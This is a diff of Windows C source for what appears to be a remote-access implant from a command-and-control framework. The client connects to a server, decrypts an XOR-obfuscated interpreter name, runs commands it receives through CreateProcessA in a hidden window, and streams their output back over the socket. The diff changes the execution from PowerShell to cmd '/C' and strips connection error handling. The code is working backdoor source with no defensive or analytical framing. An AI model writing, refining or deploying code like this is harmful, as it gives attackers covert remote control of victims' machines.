@@ -9,7 +9,6 @@
 #define CRE_N_WIN 0x08000000
 #define TIMEOUT 60
 #define TIMEOUT_MS 10000
-#define BUFFER_SIZE 4096
 
 int xor_decrypt(char* data, size_t len, char key) {
 	for (size_t i = 0; i < len && data[i]; i++){
@@ -49,8 +48,7 @@ void execute_command(SOCKET sock, const char* cmdID, const char* command) {
     char cmdLine[1024];
     xor_decrypt(var0, my_strlen(var0), 0xE2);
     
-    // chcp 65001 InputEncoding and OutputEncoding in UTF8
-    snprintf(cmdLine, sizeof(cmdLine), "%s -Command  \"%s\"", var0, command);
+    snprintf(cmdLine, sizeof(cmdLine), "%s /C %s", var0, command);
 
     BOOL success = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CRE_N_WIN, NULL, NULL, &si, &pi);
     CloseHandle(hWrite);
@@ -63,31 +61,17 @@ void execute_command(SOCKET sock, const char* cmdID, const char* command) {
         return;
     }
 
-    char buffer[BUFFER_SIZE + 1];
     DWORD exitCode = STILL_ACTIVE;
     DWORD startTime = GetTickCount();
-    DWORD bytesRead;
 
-    char lineBuf[BUFFER_SIZE * 2]; // To stack partially read lines
-    size_t lineLen = 0;
+    char buffer[512];
+    DWORD bytesRead;
     
     while (GetTickCount() - startTime < TIMEOUT_MS) {
         if (PeekNamedPipe(hRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
-
-            if (ReadFile(hRead, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+            if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                 buffer[bytesRead] = '\0';
 
-                // Stack in buffer line
-                memcpy(lineBuf + lineLen, buffer, bytesRead);
-                lineLen += bytesRead;
-                lineBuf[lineLen] = '\0';
-
-                // Replace \r\n by \n to simplify
-                for (size_t i = 0; i < lineLen; i++) {
-                    if (lineBuf[i] == '\r') lineBuf[i] = '\n';
-                }
-
-                // Process line by line
                 char* lineStart = buffer;
                 char* newline;
 
@@ -96,27 +80,29 @@ void execute_command(SOCKET sock, const char* cmdID, const char* command) {
 
                     // ignore empty lines
                     if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
-                        char outLine[BUFFER_SIZE * 2];
+                        char outLine[600];
                         snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
                         send(sock, outLine, strlen(outLine), 0);
                     }
 
+                    Sleep(10);
                     lineStart = newline + 1;
                 }
 
                 // if remainder (when no newline at end)
-                lineLen = strlen(lineStart);
-                memmove(lineBuf, lineStart, lineLen);
-                lineBuf[lineLen] = '\0';
-
-                startTime = GetTickCount();          
+                if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
+                    char outLine[600];
+                    snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
+                    send(sock, outLine, strlen(outLine), 0);
+                    startTime = GetTickCount(); // Reset timer on activity
+                }          
             }
         }
 
         GetExitCodeProcess(pi.hProcess, &exitCode);
         if (exitCode != STILL_ACTIVE) break;
 
-        Sleep(50);
+        Sleep(100);
     }
 
     if (exitCode == STILL_ACTIVE) {
@@ -158,12 +144,7 @@ int main() {
     server.sin_family = AF_INET;
     server.sin_port = htons(SERVER_PORT);
 
-    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-        printf("Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return 1;
-    }
+    connect(sock, (struct sockaddr*)&server, sizeof(server));
 
     // ID du client
     char* clientID = "{{.ID}}\n";
